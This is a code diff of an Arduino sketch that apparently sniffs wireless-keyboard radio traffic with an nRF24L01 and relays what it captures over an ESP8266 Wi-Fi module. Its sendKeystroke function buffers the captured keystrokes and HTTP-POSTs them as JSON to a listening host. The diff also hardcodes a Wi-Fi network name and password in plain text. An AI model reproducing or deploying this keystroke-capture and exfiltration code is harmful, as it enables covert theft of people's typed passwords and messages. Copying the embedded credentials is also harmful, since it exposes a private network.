@@ -1,26 +1,39 @@
 #include <SoftwareSerial.h>
-
+//#include <SD.h>
 #include <Adafruit_ESP8266.h>
 
 #include <nRF24L01.h>
 #include <RF24.h>
 #include <RF24_config.h>
 
-#define SSID "NETGEAR00" //this must be read from the sd-card
-#define PASS "Orione2000%" //this must be read from the sd-card
+//#define SSID "NETGEAR00" //this must be read from the sd-card
+//#define PASS "Orione2000%" //this must be read from the sd-card
 //#define SSID "esp8266_network" //this must be read from the sd-card
 //#define PASS "esp8266_project"
-#define HOST "192.168.1.2" //this must be read from the sd-card
+//#define HOST "192.168.1.2" //this must be read from the sd-card
 #define PORT 8000
-#define ESP_RX   3
-#define ESP_TX   4
-#define URI "/message/new/"
+//#define ESP_RX   3
+//#define ESP_TX   4
+//#define URI "/message/new/"
 
-SoftwareSerial esp8266(ESP_RX, ESP_TX);
+SoftwareSerial esp8266(3, 4);
 Adafruit_ESP8266 wifi(&esp8266, &Serial, 5);
-String user;
-String message;
+
+
+ String user = "les";
+ String HOST = "192.168.1.2";
+  String SSID = "NETGEAR00";
+  String PASS = "Orione2000%";
+  String message = "";
+
+/**String user;
+
+String SSID;
+String PASS;
+String HOST;**/
 boolean isOffline;
+
+uint8_t sd_pin = 5;
 
 /*
 
@@ -270,6 +283,74 @@ void checksum(uint8_t* p, uint8_t ck_i, uint8_t ck_offset)
   radio.startListening();
 }*/
 
+/**boolean readSD() {
+
+  File settings;
+  pinMode(sd_pin, OUTPUT);
+  digitalWrite(sd_pin, HIGH);
+
+  if (!SD.begin(sd_pin)) {
+    sp("initialization failed!");
+    return false;
+  }
+
+  settings = SD.open("settings.txt");
+  if (settings) {
+    sp("settings.txt:");
+
+    // read from the file until there's nothing else in it:
+    uint8_t index = 0;
+    String line = "";
+    while (settings.available()) {
+      char readc = settings.read();
+      
+      if (readc == '\n' || readc == EOF){
+        if (index == 0) {
+          
+          user = line;
+          index++;
+        }
+        else if (index == 1) {
+          
+          SSID = line;
+          index++;
+        }
+        else if (index == 2) {
+          //PASS = line.substring(line.indexOf(':')+1);
+          PASS = line;
+          index++;
+        }
+        else if (index == 3) {
+          //HOST = line.substring(line.indexOf(':')+1);
+          HOST = line;
+          index++;
+        }
+        line = "";
+      }
+      else
+        line += readc;
+    }
+    
+
+    //this means that the user didn't add a new line to the last line
+    if(line != ""){
+        HOST = line;
+
+    }
+    // close the file:
+    settings.close();
+  } else {
+    // if the file didn't open, print an error:
+    sp("error opening settings.txt");
+    return false;
+  }
+  //delete &settings;
+
+  return true;
+
+
+
+}*/
 char gotKeystroke(uint8_t* p)
 {
   char letter;
@@ -296,42 +377,56 @@ char gotKeystroke(uint8_t* p)
 boolean sendKeystroke(char letter)
 {
   // if we want to shout to the world the keystrokes live
-  
- if(letter == '\n' || letter == '\r'){
+ 
+ if(letter == '\n' ||  letter == '\r'){
       //try to open a socket connection 
-     if(wifi.connectTCP(F(HOST), PORT)){
+     if(wifi.connectTCP(HOST.c_str(), 8000)){
        
        char *json_string = createJson(user.c_str(),message.c_str());
-       isOffline = !wifi.httpPost(HOST, URI,json_string);
-       delay(100);
+       isOffline = !wifi.httpPost(HOST.c_str(), PSTR("/message/new/"),json_string);
+       delay(300);
        
        if(isOffline){
-         Serial.println("POST failed");
+         sp("POST failed");
        }
-       free(json_string);
        message="";
+       free(json_string);
 
      }
      else
-       Serial.println("Connection to HOST failed");
+       sp("Connection to HOST failed");
   }
   else
     message+=letter;
   
 
 }
-char* createJson(const char *user, const char *message){
+char* createJson(const char *user, const char *message) {
 
-  char *json = new char[16+strlen(user)+strlen(message)];
+  char *json = new char[25 + strlen(user) + strlen(message)];
+  //strcpy(json, F(""));
+  strcpy_P(json,PSTR("{\"message\":\""));
+  //strcat(json, F("{\"message\":\""));
+  strcat(json, message);
+  strcat_P(json, PSTR(",\",\"user\":\""));
+  strcat(json, user);
+  strcat_P(json,PSTR("\"}"));
+  return json;
+
+}
+/**char* createJson(const char *user, const char *message){
+
+  char *json = new char[25+strlen(message)+strlen(user)];
   strcpy(json,"");
   strcat(json,"{\"message\":\"");
   strcat(json,message);
   strcat(json,",\",\"user\":\"");
   strcat(json,user);
   strcat(json,"\"}");
+  
   return json;
     
-}
+}**/
 /*void storeKeystroke(char letter)
 {
 #ifdef FLASH
@@ -447,7 +542,7 @@ void loop(void)
 {
   //try to connect to wifi if offline
   if(isOffline){
-    isOffline = !wifi.connectToAP(F(SSID), F(PASS));
+    isOffline = !wifi.connectToAP(SSID.c_str(), PASS.c_str());
     delay(500);
   }
     
@@ -554,7 +649,7 @@ void loop(void)
 
     pr("    ");
     if (sz < 10)
-      Serial.print(" ");
+      sp(" ");
     Serial.print(sz);
     pr(": ");
     if (sz > PKT_SIZE) sz = PKT_SIZE;
@@ -562,13 +657,13 @@ void loop(void)
     for (int i = 0; i < sz/2; i++)
     {
       if (p[i*2] < 16)
-        Serial.print("0");
+        sp("0");
       Serial.print(p[i*2], HEX);
-      Serial.print(" ");
+      sp(" ");
       if (p[i*2+1] < 16)
-        Serial.print("0");
+        sp("0");
       Serial.print(p[i*2+1], HEX);
-      Serial.print("  ");
+      sp("  ");
     }
     prl("");
 
@@ -622,7 +717,7 @@ uint8_t n(uint8_t reg, const uint8_t* buf, uint8_t len)
 }
 
 
-// specifically for sniffing after the scan
+// specifically for sniffing after the 
 // and transmitting to a secondary device
 void setupRadio()
 {
@@ -717,7 +812,7 @@ void scan()
 
   // FCC doc says freqs 2403-2480MHz, so we reduce 126 frequencies to 78
   // http://fccid.net/number.php?fcc=C3K1455&id=451957#axzz3N5dLDG9C
-  //channel = EEPROM.read(E_LAST_CHAN);
+  channel = EEPROM.read(E_LAST_CHAN);
 
   // the order of the following is VERY IMPORTANT
   radio.setAutoAck(false);
@@ -1003,16 +1098,16 @@ void setup()
   //ledOn();
 
   Serial.begin(BAUDRATE);
-  message = "";
-  user = "les";
+
 
   //setTriggers();
   //setupGsm();
   //setupFlash();
+  //readSD();
   esp8266.begin(9600);
-  isOffline = !wifi.connectToAP(F(SSID), F(PASS));
+  isOffline = !wifi.connectToAP(SSID.c_str(), PASS.c_str());
   delay(500);
-
+  
   spl("Radio setup");
   radio.begin();
   spl("End radio setup");
